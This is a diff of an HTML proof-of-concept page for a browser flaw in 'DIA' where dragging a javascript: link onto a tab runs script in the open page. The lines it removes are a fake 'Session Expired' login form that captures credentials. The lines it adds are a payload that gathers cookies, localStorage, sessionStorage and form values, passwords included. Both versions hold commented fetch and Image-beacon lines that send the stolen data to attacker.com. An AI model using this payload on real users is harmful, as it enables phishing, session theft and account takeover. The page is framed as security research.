@@ -2,7 +2,7 @@
 <html>
 
 <head>
-    <title>Security Research - DOM Phishing PoC</title>
+    <title>Security Research - Session Data Exfiltration PoC</title>
     <style>
         body {
             font-family: 'Segoe UI', sans-serif;
@@ -21,6 +21,13 @@
             padding: 15px;
             margin: 15px 0;
             border-radius: 4px;
+        }
+
+        code {
+            background: #0f3460;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 13px;
         }
 
         .instruction {
@@ -42,76 +49,84 @@
 </head>
 
 <body>
-    <h1>🔒 DIA Browser — DOM Phishing PoC</h1>
+    <h1>🔒 DIA Browser — Cookie/Session Theft PoC</h1>
 
     <div class="warning">
         <strong>⚠️ For authorized security research only.</strong><br>
-        This PoC replaces the entire page content with a fake login form while the URL bar
-        continues to show the legitimate site's URL — a perfect phishing attack.
+        This demonstrates that dragging this file to DIA browser's tab bar executes JavaScript
+        in the context of the active page, allowing full session data exfiltration.
     </div>
 
     <div class="instruction">
         <h2>Reproduction Steps</h2>
         <ol>
-            <li>Open DIA browser and navigate to <strong>any popular website</strong> (e.g., Gmail, Facebook, a banking
-                site)</li>
-            <li><strong>Drag this file's link</strong> onto that tab</li>
-            <li>Observe: the page is replaced with a fake login form, but the URL bar still shows the real site</li>
-            <li>If a victim enters credentials, the attacker captures them</li>
+            <li>Open DIA browser and navigate to <strong>any website where you are logged in</strong></li>
+            <li><strong>Drag this HTML file</strong> onto the browser tab bar</li>
+            <li>Observe: all cookies, localStorage, and sessionStorage data are extracted</li>
+            <li>In a real attack, this data would be silently sent to an attacker-controlled server</li>
         </ol>
     </div>
 
     <h2>Payload (drag link below to any open tab):</h2>
 
+    <!--
+        PAYLOAD EXPLANATION:
+        When this anchor is dragged to the tab bar, the javascript: URI executes
+        in the context of whatever page is currently loaded in the target tab.
+        This gives full access to document.cookie, localStorage, sessionStorage,
+        and the entire DOM of the victim page.
+    -->
     <h1>
         <a href="javascript:void(function(){
             var d=document;
-
-            /* Wipe the existing page completely */
-            d.head.innerHTML='';
-            d.body.innerHTML='';
-
-            /* Inject phishing styles */
-            var style=d.createElement('style');
-            style.textContent='*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-container{background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.1);padding:48px;width:400px;max-width:90vw}.login-container h1{font-size:24px;color:#1a73e8;margin-bottom:8px;text-align:center}.login-container p{color:#5f6368;font-size:14px;text-align:center;margin-bottom:32px}.form-group{margin-bottom:20px}.form-group label{display:block;font-size:13px;color:#5f6368;margin-bottom:6px}.form-group input{width:100%;padding:12px 16px;border:1px solid #dadce0;border-radius:8px;font-size:15px;outline:none;transition:border .2s}.form-group input:focus{border-color:#1a73e8;box-shadow:0 0 0 3px rgba(26,115,232,.15)}.login-btn{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}.login-btn:hover{background:#1557b0}.footer{text-align:center;margin-top:24px;font-size:12px;color:#80868b}';
-            d.head.appendChild(style);
-
-            /* Build the phishing form */
-            var host=location.hostname||'this website';
-            var container=d.createElement('div');
-            container.className='login-container';
-            container.innerHTML='<h1>Session Expired</h1><p>Your session on <b>'+host+'</b> has expired. Please sign in again to continue.</p><form id=phish-form><div class=form-group><label>Email or username</label><input type=text id=phish-user placeholder=\"
-            Enter your email\" autofocus></div>
-            <div class=form-group><label>Password</label><input type=password id=phish-pass placeholder=\"Enter your
-                    password\"></div><button type=submit class=login-btn>Sign In</button></form>
-            <div class=footer>Secured by '+host+'</div>';
-            d.body.appendChild(container);
-
-            /* Capture submitted credentials */
-            d.getElementById('phish-form').onsubmit=function(e){
-            e.preventDefault();
-            var user=d.getElementById('phish-user').value;
-            var pass=d.getElementById('phish-pass').value;
-
-            /* In a real attack:
-            fetch('https://attacker.com/creds',{method:'POST',body:JSON.stringify({url:location.href,user:user,pass:pass})});
-            */
-
-            container.innerHTML='<h1 style=color:#e94560>⚠️ CREDENTIALS CAPTURED</h1>
-            <p style=color:#d32f2f;font-weight:bold>This is a security research demonstration.</p>
-            <div style=background:#fce4ec;padding:20px;border-radius:8px;margin:20px%200;text-align:left>
-                <p><b>Victim URL:</b> '+location.href+'</p>
-                <p><b>Username:</b> '+user+'</p>
-                <p><b>Password:</b> '+pass+'</p>
-            </div>
-            <p style=color:#5f6368;font-size:13px>In a real attack, these credentials would be silently sent to the
-                attacker\\'s server. The victim would see nothing suspicious because the URL bar still shows
-                <b>'+location.href+'</b></p>';
+            var stolen={
+                url: location.href,
+                origin: location.origin,
+                cookies: d.cookie || '(no cookies)',
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                title: d.title,
+                forms: Array.from(d.forms).map(function(f){return{action:f.action,method:f.method,inputs:Array.from(f.elements).map(function(e){return{name:e.name,type:e.type,value:e.value}})}})
             };
-            }())" id="payload-phishing" style="color: #e94560; font-size: 24px; padding: 15px 30px; background: #16213e;
-            border: 2px dashed #e94560; border-radius: 8px; text-decoration: none; display: inline-block; cursor:
-            grab;">
-            ⚡ DRAG ME TO ANY TAB → Injects Fake Login Page
+
+            /* In a real attack, the attacker would exfiltrate via: */
+            /* fetch('https://attacker.com/steal', {method:'POST', body:JSON.stringify(stolen)}); */
+            /* or: new Image().src='https://attacker.com/steal?d='+btoa(JSON.stringify(stolen)); */
+
+            var overlay=d.createElement('div');
+            overlay.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;overflow:auto;padding:30px;box-sizing:border-box;font-family:monospace;color:#0f0;font-size:13px';
+
+            var h='<h1 style=color:#e94560>⚠️ SESSION DATA STOLEN</h1>';
+            h+='<p style=color:#ff6b6b>The following data was extracted from this page because DIA browser executed a javascript: URI via drag-to-tab:</p>';
+            h+='<hr style=border-color:#333>';
+            h+='<h3 style=color:#ffd93d>🌐 Page Info</h3>';
+            h+='<p><b>URL:</b> '+stolen.url+'</p>';
+            h+='<p><b>Origin:</b> '+stolen.origin+'</p>';
+            h+='<p><b>Title:</b> '+stolen.title+'</p>';
+
+            h+='<h3 style=color:#ffd93d>🍪 Cookies (Session Tokens)</h3>';
+            h+='<pre style=background:%230a0a0a;padding:15px;border-radius:5px;overflow-x:auto;white-space:pre-wrap>'+stolen.cookies+'</pre>';
+
+            h+='<h3 style=color:#ffd93d>💾 localStorage</h3>';
+            h+='<pre style=background:%230a0a0a;padding:15px;border-radius:5px;overflow-x:auto;white-space:pre-wrap>'+stolen.localStorage+'</pre>';
+
+            h+='<h3 style=color:#ffd93d>📦 sessionStorage</h3>';
+            h+='<pre style=background:%230a0a0a;padding:15px;border-radius:5px;overflow-x:auto;white-space:pre-wrap>'+stolen.sessionStorage+'</pre>';
+
+            if(stolen.forms.length>0){
+                h+='<h3 style=color:#ffd93d>📋 Form Data (including passwords)</h3>';
+                h+='<pre style=background:%230a0a0a;padding:15px;border-radius:5px;overflow-x:auto;white-space:pre-wrap>'+JSON.stringify(stolen.forms,null,2)+'</pre>';
+            }
+
+            h+='<hr style=border-color:#333>';
+            h+='<p style=color:#e94560;font-size:16px><b>IMPACT:</b> An attacker can steal session cookies, authentication tokens, and any data stored in the browser for this origin. This enables full account takeover.</p>';
+            h+='<p style=color:#888>In a real attack, all this data would be silently sent to the attacker\\'s server via fetch() or Image beacon — the victim would see nothing.</p>';
+
+            overlay.innerHTML=h;
+            d.body.appendChild(overlay);
+        }())" id="payload-cookie"
+            style="color: #e94560; font-size: 24px; padding: 15px 30px; background: #16213e; border: 2px dashed #e94560; border-radius: 8px; text-decoration: none; display: inline-block; cursor: grab;">
+            ⚡ DRAG ME TO ANY TAB → Steals Cookies &amp; Session Data
         </a>
     </h1>
 </body>
